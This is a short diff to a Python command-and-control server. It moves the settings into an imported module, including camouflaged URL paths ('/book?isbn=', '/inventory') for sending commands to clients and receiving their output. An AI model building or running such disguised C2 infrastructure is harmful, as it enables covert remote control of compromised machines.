@@ -3,21 +3,7 @@
 from http import server
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
-
-# Port c2 server listens on
-PORT = 80
-
-# Leave blank for binding to all interfaces, otherwise specify c2 server's IP address
-BIND_ADDR = ""
-
-# Path to use for signifying a command request form a client using HTTP GET
-CMD_REQUEST = "/book?isbn="
-
-# Path to use for signifying a command output from client using HTTP POST
-CMD_RESPONSE = "/inventory"
-
-# POST variable name to use for assigning to command output from a client
-CMD_RESPONSE_KEY = "index"
+from settings import PORT, CMD_REQUEST, CMD_RESPONSE, CMD_RESPONSE_KEY, BIND_ADDR
 
 class C2Handler(BaseHTTPRequestHandler):
     """This is a child class of the BaseHTTPRequestHandler class.
